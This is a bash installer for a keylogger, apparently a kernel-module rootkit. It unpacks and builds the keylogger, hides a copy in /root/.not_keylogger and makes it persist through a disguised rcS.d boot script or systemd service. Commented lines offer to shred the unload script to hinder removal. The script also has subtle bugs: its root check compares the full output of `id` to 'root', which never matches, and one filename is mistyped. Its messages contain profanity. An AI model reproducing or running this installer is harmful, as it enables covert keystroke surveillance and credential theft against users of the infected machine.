#!/bin/bash

if [ "$(id)" != "root" ];
then
	echo "root, dumbass"
	exit
fi

if [ -d "/root/.not_keylogger" ]
then
	echo "I'm installed, motherfucker"
	echo "rm -rf /root/.not_keylogger"
	echo "to re-install"
fi
tar -xvf key-logger.tar.gz
cd key-logger
chmod +x klg_load.sh

if [ -d "/etc/rcS.d" ];
then
	cp klg_load /etc/rcS.d/S69_totes_not_a_rootkit
else
	echo "oh jeeze, fucking systemd"
	cp not_a_key_logger.service /etc/systemd/system/
	systemctl enable not_a_key_logger.service
fi
cd ..
mkdir /root/.not_keylogger
cp -R key-logger /root/.not_keylogger

cd /root/.not_keylogger
make
# clean up if you are so inclined
#shred klg_unload.sh
#rm klg_unload.shred
./klg_load.sh 
